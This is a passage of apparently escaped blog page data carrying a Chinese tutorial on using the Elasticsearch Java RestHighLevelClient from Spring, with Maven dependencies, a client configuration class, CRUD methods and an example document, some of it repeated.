class=\"line\">        IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(&quot;key&quot;).toString());</span><br><span class=\"line\">        indexRequest.source(map);</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            IndexResponse response =  client.index(indexRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 批量添加</span><br><span class=\"line\">     * 添加在 Index --&gt; Type 下</span><br><span class=\"line\">     * @param list</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void bulkAdd(List&lt;Map&lt;String,Object&gt;&gt; list)&#123;</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        BulkRequest bulkRequest = new BulkRequest(Index, Type);</span><br><span class=\"line\">        for(Map&lt;String, Object&gt; map: list)&#123;</span><br><span class=\"line\">            IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(Key).toString());</span><br><span class=\"line\">            bulkRequest.add(indexRequest.source(map));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            client.bulkAsync(bulkRequest, RequestOptions.DEFAULT, new ActionListener&lt;BulkResponse&gt;() &#123;</span><br><span class=\"line\">                @Override</span><br><span class=\"line\">                public void onResponse(BulkResponse bulkItemResponses) &#123;</span><br><span class=\"line\">                    for(BulkItemResponse response: bulkItemResponses)&#123;</span><br><span class=\"line\">                        System.out.println(response.status());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                @Override</span><br><span class=\"line\">                public void onFailure(Exception e) &#123;</span><br><span class=\"line\">                    System.out.println(&quot;批量失败&quot;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 查</span><br><span class=\"line\">     * 在企业名称属性中查找</span><br><span class=\"line\">     * 模糊</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public List&lt;Map&lt;String,Object&gt;&gt; search(String key)&#123;</span><br><span class=\"line\">        List&lt;Map&lt;String,Object&gt;&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\">        //index</span><br><span class=\"line\">        SearchRequest request = new SearchRequest(Index);</span><br><span class=\"line\"></span><br><span class=\"line\">        //type</span><br><span class=\"line\">        request.types(Type);</span><br><span class=\"line\">        RequestOptions options = RequestOptions.DEFAULT;</span><br><span class=\"line\">        //source</span><br><span class=\"line\">        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class=\"line\">        sourceBuilder.from(0);</span><br><span class=\"line\">        sourceBuilder.size(10);</span><br><span class=\"line\">        MatchQueryBuilder matchQueryBuilder = new MatchQueryBuilder(&quot;qiyemingcheng&quot;,key);</span><br><span class=\"line\">        matchQueryBuilder.fuzziness(Fuzziness.AUTO);</span><br><span class=\"line\">        sourceBuilder.query(matchQueryBuilder);</span><br><span class=\"line\">        request.source(sourceBuilder);</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            SearchResponse response = client.search(request,options);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">            SearchHits hits = response.getHits();</span><br><span class=\"line\">            SearchHit[] hits1 = hits.getHits();</span><br><span class=\"line\">            for (SearchHit hit : hits1) &#123;</span><br><span class=\"line\">                Map&lt;String, Object&gt; map = hit.getSourceAsMap();</span><br><span class=\"line\">                list.add(map);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 查询type下所有记录</span><br><span class=\"line\">     * 有个问题  默认有分页信息  返回的数据为分页size</span><br><span class=\"line\">     * 如果 size设置过大 数据太大</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public List searchType()&#123;</span><br><span class=\"line\">        List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        SearchRequest searchRequest = new SearchRequest(Index);</span><br><span class=\"line\">        searchRequest.types(Type);</span><br><span class=\"line\">        SearchSourceBuilder sourceBuilder  = new SearchSourceBuilder();</span><br><span class=\"line\">        sourceBuilder.from(0);</span><br><span class=\"line\">        //sourceBuilder.size(1000);</span><br><span class=\"line\">        QueryBuilder queryBuilder = new MatchAllQueryBuilder();</span><br><span class=\"line\">        sourceBuilder.query(queryBuilder);</span><br><span class=\"line\">        searchRequest.source(sourceBuilder);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            SearchResponse response = client.search(searchRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            SearchHits hits = response.getHits();</span><br><span class=\"line\">            SearchHit[] hits1 = hits.getHits();</span><br><span class=\"line\">            for (SearchHit hit : hits1) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                list.add(hit.getId());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 获取指定id下的数据</span><br><span class=\"line\">     * 精确</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public Map get(String key)&#123;</span><br><span class=\"line\">        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        GetRequest getRequest = new GetRequest(Index, Type, key);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            GetResponse response = client.get(getRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            map = response.getSourceAsMap();</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return map;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 删</span><br><span class=\"line\">     * 删除指定id的数据</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void  delete(String key)&#123;</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\">        DeleteRequest deleteRequest = new DeleteRequest(Index, Type, key);</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            DeleteResponse response = client.delete(deleteRequest,RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 删除type下所有文档</span><br><span class=\"line\">     * 先查询 再删除</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void deleteType()&#123;</span><br><span class=\"line\">        List&lt;String&gt; list = searchType();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            for(String id: list)&#123;</span><br><span class=\"line\">                DeleteRequest deleteRequest = new DeleteRequest(Index,Type, id);</span><br><span class=\"line\">                client.delete(deleteRequest,RequestOptions.DEFAULT);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 更新指定id下的数据</span><br><span class=\"line\">     * key为id的值</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     * @param map</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void update(String key, Map&lt;String,Object&gt; map)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        UpdateRequest updateRequest = new UpdateRequest(Index,Type,key);</span><br><span class=\"line\">        IndexRequest indexRequest = new IndexRequest().source(map);</span><br><span class=\"line\">        updateRequest.doc(indexRequest);</span><br><span class=\"line\"></span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            UpdateResponse response = client.update(updateRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><br></details>\n\n<h3 id=\"二-Es一些基本知识\"><a href=\"#二-Es一些基本知识\" class=\"headerlink\" title=\"二.Es一些基本知识\"></a>二.Es一些基本知识</h3><h4 id=\"1-Es中文档数据例子\"><a href=\"#1-Es中文档数据例子\" class=\"headerlink\" title=\"1.Es中文档数据例子\"></a>1.Es中文档数据例子</h4><p>index+type+id可以确定一个唯一文档<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;_index&quot; :   &quot;megacorp&quot;,</span><br><span class=\"line\">  &quot;_type&quot; :    &quot;employee&quot;,</span><br><span class=\"line\">  &quot;_id&quot; :      &quot;1&quot;,</span><br><span class=\"line\">  &quot;_version&quot; : 1,</span><br><span class=\"line\">  &quot;found&quot; :    true,</span><br><span class=\"line\">  &quot;_source&quot; :  &#123;</span><br><span class=\"line\">      &quot;first_name&quot; :  &quot;John&quot;,</span><br><span class=\"line\">      &quot;last_name&quot; :   &quot;Smith&quot;,</span><br><span class=\"line\">      &quot;age&quot; :         25,</span><br><span class=\"line\">      &quot;about&quot; :       &quot;I love to go rock climbing&quot;,</span><br><span class=\"line\">      &quot;interests&quot;:  [ &quot;sports&quot;, &quot;music&quot; ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>_index – 索引名称<br><br>_type – 类型名称<br><br>_id – id(这个id可以自己指定也可以自动生成)<br><br>_version – 版本号,每次改动会+1<br><br>found – true表示在document存在<br><br>_source – document的全部内容<br></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-整合\"><a href=\"#一-整合\" class=\"headerlink\" title=\"一.整合\"></a>一.整合</h3><h4 id=\"1-maven\"><a href=\"#1-maven\" class=\"headerlink\" title=\"1.maven\"></a>1.maven</h4><p>尽量和自己的Es版本一致，或者稍微大于es版本，防止功能不兼容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">   &lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;6.6.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">   &lt;groupId&gt;org.elasticsearch&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;elasticsearch&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;6.6.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-RestHighLevelClient-配置类\"><a href=\"#2-RestHighLevelClient-配置类\" class=\"headerlink\" title=\"2.RestHighLevelClient 配置类\"></a>2.RestHighLevelClient 配置类</h4><p>RestHighLevelClient也需要一个RestClient.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * RestHighLevelClient配置类</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class EsRestHighLevelClient &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  private static String[] ips;</span><br><span class=\"line\">  private static int[] ports;</span><br><span class=\"line\">  @Value(&quot;$&#123;risk.es.ips&#125;&quot;)</span><br><span class=\"line\">  public void setIps(String[] ip)&#123;</span><br><span class=\"line\">      ips = ip;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @Value(&quot;$&#123;risk.es.ports&#125;&quot;)</span><br><span class=\"line\">  public void setPorts(int[] port)&#123;</span><br><span class=\"line\">      ports = port;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  public RestHighLevelClient getClient()&#123;</span><br><span class=\"line\">      HttpHost[] httpHosts = new HttpHost[ips.length];</span><br><span class=\"line\">      for(int i=0; i&lt;ips.length; i++)&#123;</span><br><span class=\"line\">          httpHosts[i] = new HttpHost(ips[i], ports[i], &quot;http&quot;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      RestHighLevelClient client = new RestHighLevelClient(RestClient.builder(httpHosts));</span><br><span class=\"line\">      return client;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-基本CURD\"><a href=\"#3-基本CURD\" class=\"headerlink\" title=\"3.基本CURD\"></a>3.基本CURD</h4><details><br><summary> Curd </summary><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Component</span><br><span class=\"line\">public class EsCurdOptions &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Autowired</span><br><span class=\"line\">    EsRestHighLevelClient esRestHighLevelClient;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String Index = &quot;accounts&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String Type = &quot;company&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //用来做id的key</span><br><span class=\"line\">    private static final String Key = &quot;qiyemingcheng&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 增</span><br><span class=\"line\">     * 以key属性字段作为id</span><br><span class=\"line\">     * @param map</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void add(Map &lt;String,Object&gt; map)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\">        IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(&quot;key&quot;).toString());</span><br><span class=\"line\">        indexRequest.source(map);</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            IndexResponse response =  client.index(indexRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 批量添加</span><br><span class=\"line\">     * 添加在 Index --&gt; Type 下</span><br><span class=\"line\">     * @param list</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public void bulkAdd(List&lt;Map&lt;String,Object&gt;&gt; list)&#123;</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        BulkRequest bulkRequest = new BulkRequest(Index, Type);</span><br><span class=\"line\">        for(Map&lt;String, Object&gt; map: list)&#123;</span><br><span class=\"line\">            IndexRequest indexRequest = new IndexRequest(Index,Type, map.get(Key).toString());</span><br><span class=\"line\">            bulkRequest.add(indexRequest.source(map));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            client.bulkAsync(bulkRequest, RequestOptions.DEFAULT, new ActionListener&lt;BulkResponse&gt;() &#123;</span><br><span class=\"line\">                @Override</span><br><span class=\"line\">                public void onResponse(BulkResponse bulkItemResponses) &#123;</span><br><span class=\"line\">                    for(BulkItemResponse response: bulkItemResponses)&#123;</span><br><span class=\"line\">                        System.out.println(response.status());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                @Override</span><br><span class=\"line\">                public void onFailure(Exception e) &#123;</span><br><span class=\"line\">                    System.out.println(&quot;批量失败&quot;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 查</span><br><span class=\"line\">     * 在企业名称属性中查找</span><br><span class=\"line\">     * 模糊</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public List&lt;Map&lt;String,Object&gt;&gt; search(String key)&#123;</span><br><span class=\"line\">        List&lt;Map&lt;String,Object&gt;&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\">        //index</span><br><span class=\"line\">        SearchRequest request = new SearchRequest(Index);</span><br><span class=\"line\"></span><br><span class=\"line\">        //type</span><br><span class=\"line\">        request.types(Type);</span><br><span class=\"line\">        RequestOptions options = RequestOptions.DEFAULT;</span><br><span class=\"line\">        //source</span><br><span class=\"line\">        SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class=\"line\">        sourceBuilder.from(0);</span><br><span class=\"line\">        sourceBuilder.size(10);</span><br><span class=\"line\">        MatchQueryBuilder matchQueryBuilder = new MatchQueryBuilder(&quot;qiyemingcheng&quot;,key);</span><br><span class=\"line\">        matchQueryBuilder.fuzziness(Fuzziness.AUTO);</span><br><span class=\"line\">        sourceBuilder.query(matchQueryBuilder);</span><br><span class=\"line\">        request.source(sourceBuilder);</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            SearchResponse response = client.search(request,options);</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">            SearchHits hits = response.getHits();</span><br><span class=\"line\">            SearchHit[] hits1 = hits.getHits();</span><br><span class=\"line\">            for (SearchHit hit : hits1) &#123;</span><br><span class=\"line\">                Map&lt;String, Object&gt; map = hit.getSourceAsMap();</span><br><span class=\"line\">                list.add(map);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 查询type下所有记录</span><br><span class=\"line\">     * 有个问题  默认有分页信息  返回的数据为分页size</span><br><span class=\"line\">     * 如果 size设置过大 数据太大</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public List searchType()&#123;</span><br><span class=\"line\">        List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        SearchRequest searchRequest = new SearchRequest(Index);</span><br><span class=\"line\">        searchRequest.types(Type);</span><br><span class=\"line\">        SearchSourceBuilder sourceBuilder  = new SearchSourceBuilder();</span><br><span class=\"line\">        sourceBuilder.from(0);</span><br><span class=\"line\">        //sourceBuilder.size(1000);</span><br><span class=\"line\">        QueryBuilder queryBuilder = new MatchAllQueryBuilder();</span><br><span class=\"line\">        sourceBuilder.query(queryBuilder);</span><br><span class=\"line\">        searchRequest.source(sourceBuilder);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            SearchResponse response = client.search(searchRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            SearchHits hits = response.getHits();</span><br><span class=\"line\">            SearchHit[] hits1 = hits.getHits();</span><br><span class=\"line\">            for (SearchHit hit : hits1) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                list.add(hit.getId());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 获取指定id下的数据</span><br><span class=\"line\">     * 精确</span><br><span class=\"line\">     * @param key</span><br><span class=\"line\">     */</span><br><span class=\"line\">    public Map get(String key)&#123;</span><br><span class=\"line\">        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        RestHighLevelClient client = esRestHighLevelClient.getClient();</span><br><span class=\"line\"></span><br><span class=\"line\">        GetRequest getRequest = new GetRequest(Index, Type, key);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            GetResponse response = client.get(getRequest, RequestOptions.DEFAULT);</span><br><span class=\"line\">            map = response.getSourceAsMap();</span><br><span class=\"line\">            System.out.println(response.toString());</span><br><span class=\"line\">        &#125;catch (Exception e)&#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return map;</span><br><span class=\"line\">    &#125;</span><br><span 